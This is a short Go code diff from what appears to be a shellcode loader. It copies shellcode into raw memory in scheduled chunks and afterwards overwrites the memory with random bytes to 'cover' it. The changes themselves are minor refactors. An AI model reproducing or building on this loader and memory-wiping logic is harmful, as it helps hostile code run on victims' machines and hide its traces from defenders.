@@ -101,14 +101,14 @@ func VirtualProtect(shellcode []byte) error {
 	}
 
 	// copy shellcode
-	rand := random.New(0)
+	rand := random.New()
 	count := 0
 	for i := 0; i < l; i++ {
 		if count > 32 {
 			schedule()
 			count = 0
 		} else {
-			count += 1
+			count++
 		}
 		// set shellcode
 		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
@@ -146,7 +146,7 @@ func VirtualProtect(shellcode []byte) error {
 
 	// cover shellcode and free allocated memory
 	schedule()
-	rand = random.New(0)
+	rand = random.New()
 	for i := 0; i < l; i++ {
 		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
 		*b = byte(rand.Int64())
